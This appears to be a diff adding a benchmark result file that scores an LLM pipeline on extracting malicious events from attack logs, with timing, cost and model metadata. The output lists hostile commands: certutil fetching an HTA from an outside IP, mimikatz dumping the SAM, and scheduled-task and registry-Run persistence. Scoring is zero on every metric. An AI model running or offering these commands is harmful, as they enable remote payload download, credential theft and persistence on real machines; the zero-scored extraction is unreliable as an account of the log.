@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\Desktop\\shell\\Test.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "reg add \"HKLM\\SAM\" /v /f",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "Attackers exploited the system through downloaded HTAs using certutil, employed Mimikatz to steal credentials, established persistence via scheduled tasks and registry modifications, and attempted defense evasion by manipulating process debugging.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 162280,
+      "completion_tokens": 4561,
+      "total_tokens": 166841,
+      "wall_clock_s": 85.819,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 162280,
+      "completion_tokens": 4561,
+      "total_tokens": 166841,
+      "wall_clock_s": 85.819,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
